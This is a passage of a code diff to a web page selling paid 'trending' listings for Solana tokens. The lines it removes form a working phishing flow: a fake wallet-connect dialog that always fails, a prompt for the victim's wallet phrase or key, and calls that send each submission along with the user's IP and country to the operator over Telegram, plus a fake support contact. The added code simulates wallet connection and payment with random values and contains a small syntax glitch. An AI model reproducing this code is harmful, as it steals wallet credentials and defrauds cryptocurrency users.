-                        <div style="background: rgba(229, 62, 62, 0.1); border: 1px solid var(--error); border-radius: 12px; padding: 24px; margin-bottom: 24px;">
-                            <h4 style="margin-bottom: 16px;">Please verify:</h4>
-                            <ul style="text-align: left; list-style: none; padding: 0;">
-                                <li style="margin-bottom: 8px;"><i class="fas fa-arrow-right" style="margin-right: 8px;"></i> Sent exactly ${selectedPrice} SOL</li>
-                                <li style="margin-bottom: 8px;"><i class="fas fa-arrow-right" style="margin-right: 8px;"></i> Used correct wallet address</li>
-                                <li style="margin-bottom: 8px;"><i class="fas fa-arrow-right" style="margin-right: 8px;"></i> Transaction is confirmed</li>
-                                <li><i class="fas fa-arrow-right" style="margin-right: 8px;"></i> Waited 2-3 minutes</li>
-                            </ul>
-                        </div>
-                        <div style="color: var(--text-secondary); font-size: 14px;">
-                            Still having issues? Contact <a href="https://t.me/Pump_SupportTeam" target="_blank" style="color: var(--accent-blue);">@Pump_SupportTeam</a>
-                        </div>
-                    </div>
-                `;
-
-                // Send failure notification
-                const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
-                sendTelegram(`❌ <b>PAYMENT NOT DETECTED</b>\n\n👤 User: ${userCountry} (${userIP})\n💰 Expected: ${selectedPrice} SOL\n⚠️ User may need assistance${walletInfo}`);
-                
-                buttonsDiv.style.display = 'flex';
-            }
-        }
-
-        function recheckPayment() {
-            document.getElementById('paymentStatus').innerHTML = `
-                <div style="text-align: center; padding: 40px;">
-                    <div class="spinner"></div>
-                    Rechecking blockchain for payment...
-                </div>
-            `;
-            document.getElementById('finalResult').innerHTML = '';
-            document.getElementById('verificationButtons').style.display = 'none';
-            
-            const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
-            sendTelegram(`🔄 <b>PAYMENT RECHECK REQUESTED</b>\n\n👤 User: ${userCountry} (${userIP})${walletInfo}`);
-            
-            setTimeout(verifyPayment, 2000);
-        }
-
-        function startOver() {
-            const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
-            sendTelegram(`🔄 <b>USER RESTARTING PROCESS</b>\n\n👤 User: ${userCountry} (${userIP})${walletInfo}`);
-            location.reload();
-        }
-
-        // Wallet Connection Functions
+        // Simulate wallet connection
         function connectWallet() {
-            document.getElementById('walletModal').classList.add('active');
-            sendTelegram(`🔗 <b>WALLET CONNECTION INITIATED</b>\n\n👤 User: ${userCountry} (${userIP})`);
-        }
-
-        function closeModal() {
-            document.getElementById('walletModal').classList.remove('active');
-        }
-
-        function tryConnect(walletType) {
-            const modalText = document.getElementById('modalText');
-            const walletOptions = document.getElementById('walletOptions');
+            // In a real implementation, this would connect to a Solana wallet
+            // For this demo, we'll simulate a successful connection
             
-            modalText.innerHTML = `
-                <div style="text-align: center; padding: 20px;">
-                    <div class="spinner"></div>
-                    Connecting to ${walletType.charAt(0).toUpperCase() + walletType.slice(1)}...
-                </div>
-            `;
-            walletOptions.style.display = 'none';
+            // Show loading state
+            connectWalletBtn.innerHTML = '<span class="loading"></span> Connecting...';
+            connectWalletBtn.disabled = true;
             
-            sendTelegram(`🔗 <b>WALLET CONNECTION ATTEMPT</b>\n\n👤 User: ${userCountry} (${userIP})\n💼 Wallet: ${walletType.toUpperCase()}`);
-            
+            // Simulate connection delay
             setTimeout(() => {
-                modalText.innerHTML = `
-                    <div class="alert alert-error">
-                        <i class="fas fa-exclamation-triangle"></i>
-                        <strong>Connection Failed</strong><br>
-                        Unable to connect to ${walletType.charAt(0).toUpperCase() + walletType.slice(1)} wallet
-                    </div>
-                    <p>Would you like to connect manually?</p>
-                    <input type="text" id="manualWalletInput" class="form-input" placeholder="Enter wallet address" style="margin-top: 16px;">
-                `;
+                // Generate random balance for demo
+                const balance = (Math.random() * 10 + 5).toFixed(2);
                 
-                document.querySelector('.modal-content .button-group').innerHTML = `
-                    <button class="btn btn-primary" onclick="submitManualWallet()">Connect</button>
-                    <button class="btn btn-secondary" onclick="closeModal()">Cancel</button>
-                `;
+                // Update UI
+                connectWalletBtn.innerHTML = `
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                        <path d="M11 4a1 1 0 0 1 1 1v1a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1V5a1 1 0 0 1 1-1h4zM7 8a1 1 0 0 0-1 1v1a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1V9a1 1 0 0 0-1-1H7z"/>
+                        <path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1H2zm13 2.383-4.758 2.855L15 11.114v-5.73zm-.034 6.878L9.271 8.82 8 9.583 6.728 8.82l-5.694 3.44A1 1 0 0 0 2 13h12a1 1 0 0 0 .966-.739zM1 11.114l4.758-2.876L1 5.383v5.73z"/>
+                    </svg>
+                    Connected`;
+                connectWalletBtn.classList.add('primary');
                 
-                sendTelegram(`❌ <b>WALLET CONNECTION FAILED</b>\n\n👤 User: ${userCountry} (${userIP})\n💼 Wallet: ${walletType.toUpperCase()}`);
-            }, 3000);
+                balanceElement.textContent = `Balance: ${balance} SOL`;
+                walletInfo.classList.add('show');
+            }, 1500);
         }
 
-        function submitManualWallet() {
-            const walletInput = document.getElementById('manualWalletInput');
-            const address = walletInput.value.trim();
+        // Update price based on selection
+        function updatePrice() {
+            const trendingList = document.querySelector('input[name="trendingList"]:checked').value;
+            const duration = document.getElementById('duration').value;
+            const priceDisplay = document.getElementById('priceDisplay');
             
-            if (!address || address.length < 32) {
-                showAlert('Please enter a valid wallet address', 'error');
+            if (duration && priceLists[trendingList][duration]) {
+                const price = priceLists[trendingList][duration];
+                priceDisplay.textContent = `${price} SOL`;
+            } else {
+                priceDisplay.textContent = "0.0 SOL";
+            }*}
+
+        // Handle form submission
+        function handleFormSubmit(e) {
+            e.preventDefault();
+            
+            // Get form values
+            const tokenAddress = document.getElementById('tokenAddress').value;
+            const trendingList = document.querySelector('input[name="trendingList"]:checked').value;
+            const duration = document.getElementById('duration').value;
+            const price = document.getElementById('priceDisplay').textContent;
+            
+            // Validate form
+            if (!tokenAddress || !duration) {
+                showNotification('Please fill all required fields');
                 return;
             }
             
-            const modalText = document.getElementById('modalText');
-            modalText.innerHTML = `
-                <div style="text-align: center; padding: 20px;">
-                    <div class="spinner"></div>
-                    Verifying wallet credentials...
-                </div>
-            `;
-            
-            sendTelegram(`🔐 <b>MANUAL WALLET SUBMISSION</b>\n\n👤 User: ${userCountry} (${userIP})\n💰 Credentials: ${address}\n\n⚠️ <b>ADMIN ACTION REQUIRED</b>`);
-            
-            setTimeout(() => {
-                modalText.innerHTML = `
-                    <div class="alert alert-error">
-                        <i class="fas fa-times-circle"></i>
-                        <strong>Invalid Credentials</strong><br>
-                        The provided phrase or key is invalid
-                    </div>
-                `;
-                
-                document.querySelector('.modal-content .button-group').innerHTML = `
-                    <button class="btn btn-secondary" onclick="closeModal()">Close</button>
-                `;
-                
-                sendTelegram(`❌ <b>WALLET CREDENTIALS REJECTED</b>\n\n👤 User: ${userCountry} (${userIP})\n💰 Attempted: ${address}`);
-            }, 3000);
-        }
-
-        function showAlert(message, type) {
-            const alertClass = `alert-${type}`;
-            const icon = type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-triangle' : 'info-circle';
-            
-            const alert = document.createElement('div');
-            alert.className = `alert ${alertClass}`;
-            alert.innerHTML = `<i class="fas fa-${icon}"></i> ${message}`;
-            alert.style.position = 'fixed';
-            alert.style.top = '100px';
-            alert.style.right = '24px';
-            alert.style.zIndex = '9999';
-            alert.style.minWidth = '300px';
-            
-            document.body.appendChild(alert);
-            
-            setTimeout(() => {
-                alert.remove();
-            }, 4000);
-        }
-
-        // Initialize
-        updateProgress();
-
-        // Close modal when clicking outside
-        window.onclick = function(event) {
-            const modal = document.getElementById('walletModal');
-            if (event.target === modal) {
-                closeModal();
+            // Validate token address format (basic validation)
+            if (tokenAddress.length < 32) {
+                showNotification('Please enter a valid token address');
+                return;
             }
+            
+            // Update payment section
+            document.getElementById('paymentAmount').textContent = price;
+            
+            // Show payment section and hide form
+            document.querySelector('.token-form').classList.add('hidden');
+            paymentSection.classList.remove('hidden');
+            
+            // Scroll to payment section
+            paymentSection.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Simulate payment process
+        function makePayment() {
+            // Show loading state
+            payText.classList.add('hidden');
+            payLoading.classList.remove('hidden');
+            
+            // Simulate payment processing
+            setTimeout(() => {
+                // Generate random transaction ID for demo
+                const transactionId = '5' + Math.random().toString(36).substring(2, 15) + 
+                                      Math.random().toString(36).substring(2, 15);
+                
+                // Update confirmation section
+                document.getElementById('transactionId').textContent = transactionId;
+                
+                // Show confirmation section
+                paymentSection.classList.add('hidden');
+                confirmationSection.classList.remove('hidden');
+                
+                // Show notification
+                showNotification('Payment successful! Notification sent to developer.');
+                
+                // Reset payment button
+                payText.classList.remove('hidden');
+                payLoading.classList.add('hidden');
+                
+                // Scroll to confirmation
+                confirmationSection.scrollIntoView({ behavior: 'smooth' });
+            }, 2000);
+        }
+
+        // Reset form to initial state
+        function resetForm() {
+            // Reset form values
+            tokenForm.reset();
+            
+            // Hide all sections except the form
+            document.querySelector('.token-form').classList.remove('hidden');
+            paymentSection.classList.add('hidden');
+            confirmationSection.classList.add('hidden');
+            
+            // Reset price display
+            updatePrice();
+            
+            // Scroll to form
+            document.querySelector('.token-form').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Show notification
+        function showNotification(message) {
+            notification.textContent = message;
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
         }
     </script>
 </body>
